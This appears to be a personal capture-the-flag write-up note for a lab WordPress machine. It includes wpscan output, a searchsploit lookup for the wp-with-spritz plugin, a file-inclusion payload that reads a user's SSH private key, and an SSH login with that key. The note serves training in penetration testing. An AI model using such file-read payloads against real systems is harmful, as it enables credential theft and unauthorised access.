---
tags: [Beginner, Linux, Video]
title: CMS
created: '2020-07-02T07:29:14.381Z'
modified: '2020-07-02T10:34:35.993Z'
---

# CMS
- IP: `172.31.1.8`
- OS: `Linux`
## Enumeration
We find a vulnerable plugin: `searchsploit -w wp with spritz`

`?url=/home/angel/.ssh/id_rsa`
`chmod 700 angel_id_rsa`

`ssh -i angel_id_rsa angel@172.31.1.8`
### Writeup
<details>
<summary>wpscan</summary>

- `wpscan --url http://172.31.1.8/`
```
[+] URL: http://172.31.1.8/ [172.31.1.8]
[+] Started: Thu Jul  2 09:33:08 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.31.1.8/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://172.31.1.8/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://172.31.1.8/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://172.31.1.8/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://172.31.1.8/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
 |  - http://172.31.1.8/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://172.31.1.8/wp-content/themes/twentytwenty/
 | Last Updated: 2020-06-10T00:00:00.000Z
 | Readme: http://172.31.1.8/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | Style URL: http://172.31.1.8/wp-content/themes/twentytwenty/style.css?ver=1.1
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://172.31.1.8/wp-content/themes/twentytwenty/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-with-spritz
 | Location: http://172.31.1.8/wp-content/plugins/wp-with-spritz/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-08-20T20:15:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 4.2.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://172.31.1.8/wp-content/plugins/wp-with-spritz/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=========================================> (21 / 21) 100.00% Time: 00:00:00


```
</detail>

<details>
<summary></summary>

- ``
```
```
</detail>
